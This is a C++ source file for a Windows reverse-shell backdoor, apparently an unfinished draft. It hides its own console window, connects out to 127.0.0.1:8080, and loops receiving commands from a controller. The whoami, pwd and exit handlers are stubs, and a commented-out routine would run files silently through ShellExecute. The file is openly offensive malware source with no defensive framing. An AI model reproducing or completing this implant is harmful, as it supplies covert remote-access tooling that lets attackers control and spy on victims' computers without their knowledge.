//Main headers

#include <winsock2.h>       //Socket connection
#include <windows.h>        //Used for WinApi calls
#include <ws2tcpip.h>       //TCP-IP Sockets
#include <stdio.h>

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024

// Debug headers
#include <iostream>

// void exec(char* returnval, int returnsize, char *lx3fl3e)
// {
//     if (32 >= (int)(ShellExecute(NULL,"open", lx3fl3e, NULL, NULL, SW_HIDE))) //Get return value in int
//     {
//         strcat(returnval, "[x] Error executing file..\n");
//     }
//     else
//     {
//         strcat(returnval, "\n");
//     }
// }

void RevShell()
{
    WSADATA wsaver;
    WSAStartup(MAKEWORD(2,2), &wsaver);
    SOCKET tcpsock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr("127.0.0.1");
    addr.sin_port = htons(8080);

    if(connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr))==SOCKET_ERROR) {
        closesocket(tcpsock);
        WSACleanup();
        exit(0);
    }
    else {
        std::cout << "[+] Connected to client. waiting for incoming command..." << std::endl;
        char CommandReceived[DEFAULT_BUFLEN] = "";
        while (true)
        {
            int Result = recv(tcpsock, CommandReceived, DEFAULT_BUFLEN, 0);
            std::cout << "Command received: " << CommandReceived;
            std::cout << "Length of Command received: " << Result << std::endl;
            if ((strcmp(CommandReceived, "whoami\n") == 0)) {
                std::cout << "Command parsed: whoami" << std::endl;
                //Execute a whoami() function
            }
            else if ((strcmp(CommandReceived, "pwd\n") == 0)) {
                std::cout << "Command parsed: pwd" << std::endl;
                //Execute a pwd() function
            }
            else if ((strcmp(CommandReceived, "exit\n") == 0)) {
                std::cout << "Command parsed: exit";
                std::cout << "Closing connection" << std::endl;
                //Exit gracefully
            }
            else {
                std::cout << "Command not parsed!" << std::endl;
            }
            memset(CommandReceived, 0, sizeof(CommandReceived));
        }
    }
    closesocket(tcpsock);
    WSACleanup();
    exit(0);
}

int main()
{
    HWND stealth;
    AllocConsole();
    stealth=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(stealth,0);
    RevShell();
    return 0;
}
